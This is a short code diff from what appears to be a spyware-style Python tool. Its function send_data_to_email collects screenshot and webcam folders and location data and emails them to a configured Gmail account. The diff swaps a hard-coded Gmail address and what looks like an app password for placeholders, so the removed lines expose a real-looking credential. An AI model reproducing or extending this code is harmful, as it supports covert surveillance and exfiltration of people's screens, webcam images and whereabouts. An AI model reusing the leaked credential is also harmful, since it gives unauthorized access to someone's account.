@@ -4,8 +4,8 @@ from email.message import EmailMessage
 from utils.geolocation import get_location  
 
 # 🔐 Set your Gmail credentials here
-EMAIL_ADDRESS = "kpunithnaik25@gmail.com"
-EMAIL_PASSWORD = "jssg nqkk nsqe tqfd"
+EMAIL_ADDRESS = "your email address"
+EMAIL_PASSWORD = "strong password"
 
 def send_data_to_email(screenshot_folder, webcam_folder, location_info=None):
     try:
@@ -49,5 +49,6 @@ def send_data_to_email(screenshot_folder, webcam_folder, location_info=None):
 
     except Exception as e:
         print(f"[❌] Failed to send email: {e}")
+
 
 
